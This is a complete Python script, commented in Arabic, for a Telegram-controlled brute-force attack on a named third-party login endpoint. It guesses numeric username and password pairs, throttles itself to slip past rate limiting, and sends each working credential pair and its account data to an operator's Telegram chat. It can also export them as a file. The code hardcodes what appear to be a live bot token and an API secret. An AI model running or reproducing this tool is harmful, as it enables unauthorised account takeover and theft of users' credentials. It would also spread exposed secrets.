import asyncio
import aiohttp
import json
import os
import random
import time
import tempfile
from datetime import datetime

# ======================================================
# 1. الإعدادات المضمنة (ثابتة)
# ======================================================
BOT_TOKEN = "8614310870:AAHdKol8ghglbsBnRXOis4CcdGpsbJnwxoc"
CHAT_ID = "6470602390"

BRIDGE_NET_ID = 274
BRIDGE_SECRET = "3b7e0b1fa4a98ad14dfcf5a4a82a06c1058f0fa2d1ee60fcb4fe1b30e776d324"
BRIDGE_URL = "https://api.almaqadma.tech/auth"

DEFAULT_USER_MIN = 0
DEFAULT_USER_MAX = 999999
DEFAULT_PASS_MIN = 0
DEFAULT_PASS_MAX = 99
BASE_DELAY = 0.1
RANDOM_MODE = True
MAX_ATTEMPTS_RANDOM = 1000000

INITIAL_CONCURRENCY = 3
MIN_CONCURRENCY = 1
MAX_CONCURRENCY = 15
TARGET_RESPONSE_TIME = 1.5
CHECKPOINT_FILE = "checkpoint.json"

# ======================================================
# 2. Telegram Sender (إرسال الرسائل)
# ======================================================
class TelegramSender:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self._token_invalid = False

    async def send(self, text, parse_mode="HTML", retries=3):
        """إرسال رسالة نصية إلى تليجرام"""
        if not self.token or not self.chat_id or self._token_invalid:
            return
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": text, "parse_mode": parse_mode}
        for attempt in range(retries):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, json=payload, timeout=10) as resp:
                        if resp.status == 404:
                            print("❌ Invalid BOT_TOKEN")
                            self._token_invalid = True
                            return
                        elif resp.status != 200:
                            print(f"⚠️ Telegram error {resp.status}")
                        return
            except Exception as e:
                print(f"⚠️ Send attempt {attempt+1} failed: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)

    async def send_document(self, file_path, caption="", retries=3):
        """إرسال ملف إلى تليجرام"""
        if not self.token or not self.chat_id or self._token_invalid:
            return
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        for attempt in range(retries):
            try:
                async with aiohttp.ClientSession() as session:
                    with open(file_path, "rb") as f:
                        data = aiohttp.FormData()
                        data.add_field("chat_id", self.chat_id)
                        data.add_field("document", f, filename=os.path.basename(file_path))
                        if caption:
                            data.add_field("caption", caption)
                        async with session.post(url, data=data, timeout=30) as resp:
                            if resp.status == 404:
                                print("❌ Invalid BOT_TOKEN")
                                self._token_invalid = True
                                return
                            elif resp.status != 200:
                                print(f"⚠️ Telegram error {resp.status}")
                            return
            except Exception as e:
                print(f"⚠️ Send document attempt {attempt+1} failed: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)

    async def validate_token(self):
        """التحقق من صحة التوكن"""
        if not self.token:
            return False
        url = f"https://api.telegram.org/bot{self.token}/getMe"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 404:
                        print("❌ Invalid BOT_TOKEN")
                        return False
                    data = await resp.json()
                    if data.get("ok"):
                        print(f"✅ Bot valid: @{data['result']['username']}")
                        return True
                    return False
        except Exception as e:
            print(f"⚠️ Validation error: {e}")
            return False

# ======================================================
# 3. فئة التخمين العشوائي (معدلة لدعم الأوامر)
# ======================================================
class RandomBruteForcer:
    def __init__(self, bot_sender, user_min=DEFAULT_USER_MIN, user_max=DEFAULT_USER_MAX,
                 pass_min=DEFAULT_PASS_MIN, pass_max=DEFAULT_PASS_MAX):
        self.bot = bot_sender
        self.user_min = user_min
        self.user_max = user_max
        self.pass_min = pass_min
        self.pass_max = pass_max

        self.concurrency = INITIAL_CONCURRENCY
        self.response_times = []
        self.consecutive_failures = 0
        self.consecutive_rate_limit = 0
        self.base_delay_multiplier = 1.0
        self.global_pause_until = 0
        self.is_running = False
        self.stop_requested = False
        self.paused = False
        self.start_time = 0
        self.attempts = 0
        self.found_count = 0
        self.results = []          # قائمة بالنتائج الناجحة (username, password, data)
        self.tried_set = set()

    @staticmethod
    def pad_user(num):
        return str(num).zfill(6)

    @staticmethod
    def pad_pass(num):
        return str(num).zfill(2)

    @staticmethod
    def jitter(delay):
        return delay * (0.8 + random.random() * 0.4)

    def get_timestamp(self):
        return int(time.time())

    # ------------------- دالة الطلب (ترسل النجاح للبوت) -------------------
    async def try_login(self, session, username, password, retry=0):
        payload = {
            "n": BRIDGE_NET_ID,
            "u": username,
            "w": password,
            "t": self.get_timestamp(),
            "k": BRIDGE_SECRET
        }
        start_req = time.perf_counter()
        try:
            async with session.post(BRIDGE_URL, json=payload, timeout=10) as resp:
                elapsed = time.perf_counter() - start_req
                data = await resp.json()

                if resp.status == 429:
                    self.consecutive_rate_limit += 1
                    if self.consecutive_rate_limit > 1:
                        self.concurrency = max(MIN_CONCURRENCY, int(self.concurrency * 0.5))
                        self.base_delay_multiplier = min(self.base_delay_multiplier * 1.5, 10)
                    else:
                        self.concurrency = min(self.concurrency, 2)
                        self.base_delay_multiplier = max(self.base_delay_multiplier, 2)

                    if retry < 5:
                        delay = self.jitter(2.0 * (2 ** retry) * self.base_delay_multiplier)
                        await asyncio.sleep(delay)
                        return await self.try_login(session, username, password, retry + 1)
                    else:
                        return {"success": False, "is_rate_limit": True}

                if resp.status >= 500:
                    self.consecutive_failures += 1
                    if retry < 5:
                        await asyncio.sleep(self.jitter(1.0 * (2 ** retry)))
                        return await self.try_login(session, username, password, retry + 1)
                    else:
                        return {"success": False}

                if not resp.ok:
                    self.consecutive_failures = 0
                    return {"success": False}

                # نجاح (200)
                self.consecutive_failures = 0
                self.consecutive_rate_limit = max(0, self.consecutive_rate_limit - 1)
                if self.base_delay_multiplier > 1:
                    self.base_delay_multiplier = max(1, self.base_delay_multiplier * 0.9)

                # تخزين النتيجة
                self.found_count += 1
                self.results.append({
                    "username": username,
                    "password": password,
                    "data": data,
                    "timestamp": datetime.now().isoformat()
                })

                # إرسال إشعار نجاح
                success_msg = (
                    f"✅ <b>نجاح!</b>\n"
                    f"👤 المستخدم: <code>{username}</code>\n"
                    f"🔑 كلمة المرور: <code>{password}</code>\n"
                    f"📦 الاستجابة: <code>{json.dumps(data, ensure_ascii=False)[:300]}</code>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"<b>mb4</b>"
                )
                await self.bot.send(success_msg)

                return {"success": True, "data": data, "elapsed": elapsed}

        except Exception as e:
            self.consecutive_failures += 1
            if retry < 5:
                await asyncio.sleep(self.jitter(1.0 * (2 ** retry)))
                return await self.try_login(session, username, password, retry + 1)
            return {"success": False}

    # ------------------- تحديث التزامن -------------------
    def update_concurrency(self, avg_response):
        if avg_response <= 0:
            return
        if avg_response > TARGET_RESPONSE_TIME and self.concurrency > MIN_CONCURRENCY:
            new_conc = max(MIN_CONCURRENCY, int(self.concurrency * 0.8))
            if new_conc != self.concurrency:
                self.concurrency = new_conc
        elif avg_response < TARGET_RESPONSE_TIME * 0.5 and self.concurrency < MAX_CONCURRENCY and self.consecutive_rate_limit == 0:
            new_conc = min(MAX_CONCURRENCY, int(self.concurrency * 1.2))
            if new_conc != self.concurrency:
                self.concurrency = new_conc

    # ------------------- التشغيل الرئيسي -------------------
    async def run(self):
        print(f"🎲 بدء البحث العشوائي (النطاق: {self.user_min}-{self.user_max} / {self.pass_min}-{self.pass_max})")
        total_possible = (self.user_max - self.user_min + 1) * (self.pass_max - self.pass_min + 1)
        attempts_made = 0

        if not self.tried_set:
            self.tried_set = set()

        async with aiohttp.ClientSession() as session:
            while not self.stop_requested:
                # التحقق من الإيقاف المؤقت
                while self.paused and not self.stop_requested:
                    await asyncio.sleep(1)
                    if self.stop_requested:
                        break
                if self.stop_requested:
                    break

                # انتظار في حال التوقف المؤقت العالمي (غير مستخدم)
                while self.global_pause_until > time.time():
                    await asyncio.sleep(0.5)
                    if self.stop_requested or self.paused:
                        break
                if self.stop_requested:
                    break

                # اختيار عشوائي
                user = random.randint(self.user_min, self.user_max)
                pwd = random.randint(self.pass_min, self.pass_max)
                key = f"{user}:{pwd}"
                if key in self.tried_set:
                    continue
                self.tried_set.add(key)
                self.attempts += 1
                attempts_made += 1

                username, password = self.pad_user(user), self.pad_pass(pwd)

                result = await self.try_login(session, username, password)

                if result.get("elapsed"):
                    self.response_times.append(result["elapsed"])
                    if len(self.response_times) > 50:
                        self.response_times.pop(0)

                avg = sum(self.response_times) / len(self.response_times) if self.response_times else 0
                self.update_concurrency(avg)

                dynamic_delay = BASE_DELAY * self.base_delay_multiplier
                if self.consecutive_failures > 5 or self.consecutive_rate_limit > 2:
                    dynamic_delay = min(dynamic_delay * 2, 3.0)
                await asyncio.sleep(self.jitter(dynamic_delay))

                if self.attempts % 1000 == 0:
                    progress = (self.attempts / total_possible) * 100 if total_possible > 0 else 0
                    print(f"📊 التقدم: {progress:.1f}% | محاولات: {self.attempts:,} | نجاحات: {self.found_count}")

                if len(self.tried_set) >= total_possible:
                    print("🏁 تم تجربة جميع التركيبات.")
                    break

        self.is_running = False
        elapsed = time.time() - self.start_time
        print(f"🏁 انتهى! الوقت: {int(elapsed)}ث | محاولات: {self.attempts:,} | نجاحات: {self.found_count}")

    # ------------------- طرق التحكم -------------------
    async def start(self):
        if self.is_running:
            return
        self.is_running = True
        self.stop_requested = False
        self.paused = False
        self.start_time = time.time()
        self.response_times = []
        self.consecutive_failures = 0
        self.consecutive_rate_limit = 0
        self.global_pause_until = 0
        self.base_delay_multiplier = 1.0

        try:
            await self.run()
        except Exception as e:
            print(f"💥 خطأ: {e}")
        finally:
            self.is_running = False

    def pause(self):
        self.paused = True
        print("⏸️ تم الإيقاف المؤقت")

    def resume(self):
        self.paused = False
        print("▶️ استئناف")

    def stop(self):
        self.stop_requested = True
        print("⏹️ تم طلب الإيقاف")

    def set_range(self, user_min, user_max, pass_min=None, pass_max=None):
        """تغيير نطاق البحث (يتم إعادة ضبط tried_set)"""
        self.user_min = user_min
        self.user_max = user_max
        if pass_min is not None:
            self.pass_min = pass_min
        if pass_max is not None:
            self.pass_max = pass_max
        self.tried_set.clear()
        print(f"🔄 تم تغيير النطاق إلى: {user_min}-{user_max} / {self.pass_min}-{self.pass_max}")

    def export_results(self):
        """تصدير النتائج إلى ملف نصي"""
        if not self.results:
            return None
        lines = []
        for r in self.results:
            lines.append(f"{r['timestamp']} | {r['username']}:{r['password']} | {json.dumps(r['data'], ensure_ascii=False)}")
        return "\n".join(lines)

    def clear_results(self):
        """مسح النتائج المحفوظة"""
        self.results.clear()
        self.found_count = 0
        print("🗑️ تم مسح النتائج")

# ======================================================
# 4. بوت تليجرام المتقدم (استقبال الأوامر)
# ======================================================
class TelegramCommandBot(TelegramSender):
    def __init__(self, token, chat_id):
        super().__init__(token, chat_id)
        self.update_offset = None
        self.forcer = None          # كائن RandomBruteForcer الحالي
        self.forcer_task = None     # مهمة asyncio للتشغيل
        self.running = False        # حالة تشغيل البوت
        self.last_status_msg = None # لتحديث الرسالة السابقة

    async def get_updates(self, offset=None, timeout=30):
        """جلب التحديثات من تليجرام"""
        url = f"https://api.telegram.org/bot{self.token}/getUpdates"
        params = {"timeout": timeout, "allowed_updates": ["message"]}
        if offset is not None:
            params["offset"] = offset
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, params=params, timeout=timeout+5) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get("ok"):
                            return data.get("result", [])
                    else:
                        print(f"⚠️ getUpdates error: {resp.status}")
                        return []
        except asyncio.TimeoutError:
            return []
        except Exception as e:
            print(f"⚠️ getUpdates exception: {e}")
            return []

    async def handle_command(self, message):
        """معالجة الأمر الوارد"""
        text = message.get("text", "")
        chat_id = message.get("chat", {}).get("id")
        if chat_id != self.chat_id:
            # الرد فقط من المستخدم المصرح له
            return

        print(f"📩 أمر وارد: {text}")

        # تحليل الأمر والمعاملات
        parts = text.strip().split()
        cmd = parts[0].lower() if parts else ""

        # ===== /start =====
        if cmd == "/start":
            if self.forcer and self.forcer.is_running:
                await self.send("⚠️ البحث قيد التشغيل بالفعل.")
            else:
                # إنشاء فورسر جديد بالنطاق الافتراضي أو الحالي
                user_min = DEFAULT_USER_MIN
                user_max = DEFAULT_USER_MAX
                pass_min = DEFAULT_PASS_MIN
                pass_max = DEFAULT_PASS_MAX
                if self.forcer:
                    # الاحتفاظ بالنطاق السابق إذا كان موجوداً
                    user_min = self.forcer.user_min
                    user_max = self.forcer.user_max
                    pass_min = self.forcer.pass_min
                    pass_max = self.forcer.pass_max
                self.forcer = RandomBruteForcer(self, user_min, user_max, pass_min, pass_max)
                self.forcer_task = asyncio.create_task(self.forcer.start())
                await self.send(f"🟢 <b>بدء البحث العشوائي</b>\nالنطاق: {user_min}-{user_max} / {pass_min}-{pass_max}")

        # ===== /pause =====
        elif cmd == "/pause":
            if self.forcer and self.forcer.is_running:
                if self.forcer.paused:
                    await self.send("⏸️ البحث متوقف مؤقتاً بالفعل.")
                else:
                    self.forcer.pause()
                    await self.send("⏸️ تم إيقاف البحث مؤقتاً.")
            else:
                await self.send("⚠️ لا يوجد بحث قيد التشغيل.")

        # ===== /resume =====
        elif cmd == "/resume":
            if self.forcer and self.forcer.is_running:
                if not self.forcer.paused:
                    await self.send("▶️ البحث مستمر بالفعل.")
                else:
                    self.forcer.resume()
                    await self.send("▶️ تم استئناف البحث.")
            else:
                await self.send("⚠️ لا يوجد بحث قيد التشغيل.")

        # ===== /stop =====
        elif cmd == "/stop":
            if self.forcer and self.forcer.is_running:
                self.forcer.stop()
                if self.forcer_task and not self.forcer_task.done():
                    # انتظار انتهاء المهمة (مع مهلة)
                    try:
                        await asyncio.wait_for(self.forcer_task, timeout=5)
                    except asyncio.TimeoutError:
                        self.forcer_task.cancel()
                await self.send("⏹️ تم إيقاف البحث نهائياً.")
            else:
                await self.send("⚠️ لا يوجد بحث قيد التشغيل.")

        # ===== /status =====
        elif cmd == "/status":
            if self.forcer and self.forcer.is_running:
                elapsed = int(time.time() - self.forcer.start_time) if self.forcer.start_time else 0
                total_possible = (self.forcer.user_max - self.forcer.user_min + 1) * (self.forcer.pass_max - self.forcer.pass_min + 1)
                progress = (self.forcer.attempts / total_possible) * 100 if total_possible > 0 else 0
                status_text = (
                    f"📊 <b>حالة البحث</b>\n"
                    f"⏱️ الوقت: {elapsed} ثانية\n"
                    f"🔄 المحاولات: {self.forcer.attempts:,}\n"
                    f"✅ النجاحات: {self.forcer.found_count}\n"
                    f"📈 التقدم: {progress:.2f}%\n"
                    f"⏸️ متوقف مؤقت: {'نعم' if self.forcer.paused else 'لا'}\n"
                    f"🔢 التزامن: {self.forcer.concurrency}\n"
                    f"📌 النطاق: {self.forcer.user_min}-{self.forcer.user_max} / {self.forcer.pass_min}-{self.forcer.pass_max}"
                )
                await self.send(status_text)
            else:
                await self.send("⚠️ لا يوجد بحث قيد التشغيل.")

        # ===== /set_range <min> <max> =====
        elif cmd == "/set_range":
            if len(parts) < 3:
                await self.send("❌ الاستخدام: /set_range <min> <max>")
                return
            try:
                new_min = int(parts[1])
                new_max = int(parts[2])
                if new_min > new_max:
                    await self.send("❌ يجب أن يكون الحد الأدنى أقل من الحد الأقصى.")
                    return
                # إذا كان البحث يعمل، نوقفه ونعيد تشغيله بالنطاق الجديد
                if self.forcer and self.forcer.is_running:
                    self.forcer.stop()
                    if self.forcer_task and not self.forcer_task.done():
                        try:
                            await asyncio.wait_for(self.forcer_task, timeout=5)
                        except asyncio.TimeoutError:
                            self.forcer_task.cancel()
                # إنشاء فورسر جديد بالنطاق الجديد (نحتفظ بنطاق الباسورد السابق)
                pass_min = self.forcer.pass_min if self.forcer else DEFAULT_PASS_MIN
                pass_max = self.forcer.pass_max if self.forcer else DEFAULT_PASS_MAX
                self.forcer = RandomBruteForcer(self, new_min, new_max, pass_min, pass_max)
                self.forcer_task = asyncio.create_task(self.forcer.start())
                await self.send(f"🔄 تم تغيير النطاق إلى: {new_min}-{new_max} / {pass_min}-{pass_max}\nتم بدء البحث من جديد.")
            except ValueError:
                await self.send("❌ يجب إدخال أرقام صحيحة.")

        # ===== /export =====
        elif cmd == "/export":
            if not self.forcer or not self.forcer.results:
                await self.send("⚠️ لا توجد نتائج لتصديرها.")
                return
            export_text = self.forcer.export_results()
            if not export_text:
                await self.send("⚠️ لا توجد نتائج.")
                return
            # حفظ في ملف مؤقت
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
                f.write(export_text)
                tmp_path = f.name
            try:
                await self.send_document(tmp_path, caption="📄 نتائج البحث")
                os.unlink(tmp_path)
            except Exception as e:
                await self.send(f"❌ فشل إرسال الملف: {e}")

        # ===== /clear =====
        elif cmd == "/clear":
            if self.forcer:
                self.forcer.clear_results()
                await self.send("🗑️ تم مسح النتائج الحالية.")
            else:
                await self.send("⚠️ لا يوجد فورسر لمسح نتائجه.")

        # ===== /help (إضافي) =====
        elif cmd == "/help":
            help_text = (
                "🤖 <b>أوامر البوت المتاحة</b>\n"
                "/start - بدء البحث العشوائي\n"
                "/pause - إيقاف مؤقت\n"
                "/resume - استئناف\n"
                "/stop - إيقاف نهائي\n"
                "/status - عرض التقدم\n"
                "/set_range &lt;min&gt; &lt;max&gt; - تغيير نطاق المستخدمين\n"
                "/export - تصدير النتائج (ملف)\n"
                "/clear - مسح النتائج\n"
                "/help - عرض هذه المساعدة"
            )
            await self.send(help_text)

        else:
            # تجاهل الرسائل غير المعروفة
            pass

    # ------------------- حلقة الاستقبال الرئيسية -------------------
    async def run_polling(self):
        self.running = True
        print("🔄 بدء استقبال الأوامر...")
        while self.running:
            updates = await self.get_updates(offset=self.update_offset)
            for update in updates:
                if "message" in update:
                    await self.handle_command(update["message"])
                # تحديث offset لتجنب إعادة معالجة التحديثات
                if "update_id" in update:
                    self.update_offset = update["update_id"] + 1
            # انتظار قصير لتجنب الاستهلاك المفرط
            await asyncio.sleep(0.5)
        print("⏹️ توقف استقبال الأوامر.")

    def stop_polling(self):
        self.running = False

# ======================================================
# 5. التشغيل الرئيسي
# ======================================================
async def main():
    print("🚀 تشغيل بوت التخمين العشوائي مع أوامر تليجرام...")

    bot = TelegramCommandBot(BOT_TOKEN, CHAT_ID)

    print("🔍 التحقق من صحة توكن البوت...")
    if not await bot.validate_token():
        print("❌ توكن غير صالح.")
        return

    # إرسال رسالة بدء
    await bot.send("🤖 <b>بوت التخمين العشوائي قيد التشغيل</b>\nأرسل /help لعرض الأوامر.")

    # تشغيل حلقة استقبال الأوامر
    try:
        await bot.run_polling()
    except KeyboardInterrupt:
        print("🛑 تم إيقاف البوت يدوياً.")
    finally:
        # تنظيف المهام
        if bot.forcer_task and not bot.forcer_task.done():
            bot.forcer_task.cancel()
            try:
                await bot.forcer_task
            except asyncio.CancelledError:
                pass
        bot.running = False

    print("✅ تم إنهاء البوت.")

if __name__ == "__main__":
    asyncio.run(main())
